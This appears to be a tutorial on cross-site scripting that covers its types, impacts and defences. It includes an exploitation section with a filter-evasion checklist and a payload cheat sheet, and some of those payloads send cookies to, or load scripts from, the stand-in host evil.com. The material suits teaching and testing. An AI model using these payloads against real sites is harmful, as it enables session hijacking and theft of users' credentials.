Cross-Site Scripting is a type of injection where JavaScript code can be injected into a website. A XSS attack is where an attacker has embedded malicious code, often in the form of a browser-side script that is then sent to an unsuspecting user when they request the webpage.

These attacks can occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. The malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

There are 3 types of XSS attacks:
- [Reflective XSS](#reflective-xss) - Injected code is reflected back to a user by the web application
- [Stored XSS](#stored-xss) - The injected code is stored on the webserver and is requested by the user
- [DOM-Based XSS](#dom-based-xss) - The injected code manipulates the client-side DOM, resulting in the execution of code on the victim's browser. 

## Reflective XSS
Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.

When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable website, which reflects the attack back to the user’s browser. The browser then executes this as it appears to have come from a 'Trusted' server.

This can lead to various security issue, such as stealing user information (eg. credentials or tokens) or performing unauthorised actions on behalf of a user.

These attacks are often initiated by creating malicious links or forms that exploit vulnerabilities in the target application.

Sometimes referred to as Non-Persistent or Type-II XSS.

## Stored XSS
Stored attacks are those where the injected script is permanently stored on the target server, such as in a database, comment section, message forum etc. The victim then retries the script from the server when it requests the stored information.

Unlike reflective XSS, the injected code is not reflected back immediately but rather stored on the target server and delivered to other users later. This makes stored XSS attacks particularly dangerous, as the malicious code affects multiple users and can lead to unauthorized access, data theft, or even complete website compromise.

Sometimes referred to a Persistent or Type-II XSS.

## DOM-Based XSS
This attack occurs when an attacker injects and manipulates malicious code into the Document Object Model (DOM) of a webpage. In DOM-Based XSS attacks the malicious injected code is usually executed by JavaScript directly in the victim's browser, without being sent to the server.

The vulnerable webpage often includes JavaScript that reads data from the URL or user input and then dynamically updates the DOM, but fails to properly sanitize or validate the input, allowing injected code to be executed.

## Impacts of XSS
- Impersonating or masquerading as the victim user
- Hijacking a user's session
- Perform unauthorized actions on behalf of the user
- Steal sensitive information
- Perform phishing attacks
- Capture user credentials
- Capture keystrokes
- Deface the website / Edit its content
- Inject trojan functionality into the website

## Exploiting XSS
When exploiting an XSS vulnerability, you need to understand how the application behaves towards specific payloads. The following checklist can be used before exploiting an XSS vulnerability:
- Find the backlisted/filtered characters. XSS locators can be used for this: `'';! - "<XSS>=&{()}`
- Observe what tags are blocked by Web Application Firewall (WAF) and which keywords are allowed (`iframe`, `img`, `body` etc.)
- Try character encoding ([URL encoding](https://www.w3schools.com/tags/ref_urlencode.ASP), [Double URL encoding](https://owasp.org/www-community/Double_Encoding), UTF-8 Unicode encoding, Long UTF-8 Unicode encoding, Hex encoding etc.)
- Try [XSS using HTML quote encapsulation](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-using-html-quote-encapsulation)
- Try [URL string evasion](https://docs.trellix.com/bundle/network-security-platform-application-notes/page/GUID-CCB698B2-851B-48DE-8E1F-93968ED36C2E.html)
- Create the payload list according to the allowed keywords
- Brute-force the application with the XSS payload list you just created

> Note: Double URL encoding can be tried since the first decoding process is performed by HTTP protocol and the resultant encoded URL will bypass the XSS filter.

### XSS Cheatsheet
A very useful OWASP XSS [cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).
Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-Payloads/tree/master)

#### XSS Locators
```HTML
'';!--"<XSS>=&{()}
```

#### Classic Payloads
```HTML
<svg/onload=alert(1)>
<script>alert(1)</script>
<script    >alert(1)</script>
<ScRipT>alert(1)</scRipT>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>
```

#### HTML Tags
```HTML
<img/src=x a='' onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<img src=`x`onerror=alert(1)>
<img src='/' onerror='alert("kalisa")'>
<IMG SRC=# onmouseover="alert('xss')">
<IMG SRC= onmouseover="alert('xss')">
<IMG onmouseover="alert('xss')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<SCRIPT SRC=http:/evil.com/xss.js?< B >
"><XSS<test accesskey=x onclick=alert(1)//test
<svg><discard onbegin=alert(1)>
<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
```

The `javascript:alert(1);` can be injected to run in-line java (eg. in a URL)

### Useful Example Situations
#### Bypass Angle Bracket Filter
In a Reflective XSS where the `<` & `>` are both blacklisted/encoded. You can still inject code if the user input is injected within a tag already. This relies on the `"` not being escaped as `&quot`.

```HTML
" onmouseover="alert(1)
```

Would result in something like a search box like:
```HTML
<input type=text placeholder='Search the blog...' name=search value="{{ user.input }}">
```

Being turned into:
```HTML
<input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)">
```

#### String Subtraction Injection
If a variable is set of the user input eg.
```js
var userInput = '';
```

If you then take a string and subtract a function from it, it will in turn run the function. Eg.
```js
var userInput = ''-alert(1)-'';
```

So the payload would be `'-alert(1)-'`

## Defending from XSS
### Input Validation
#### Allow Lists - Recommended
- These lists reduce the input to a known attack surface
- Most inputs can be limited to alphanumeric to prevent XSS
- Special characters can be allowed on an exception basis

#### Deny Lists - No Recommended
- Only covers the known methods, could be exploited by creative attackers still

#### Client Side input validation - Not Recommended
- Can easily be bypassed by sending requests directly to the server
- Only useful for application usability

### Proven Validation and Encoding Functionality
- Protect both the input through validation and output through encoding - "defence in depth" principle
- Use proven, reputable libraries to protect the application
  - Its easy to make mistakes or not cover some edge cases when you write the functionality yourself
- Utilise a framework that has a central set of functionality that validates and encodes data
  - Protects you from missing some areas in your code and leaving those places exposed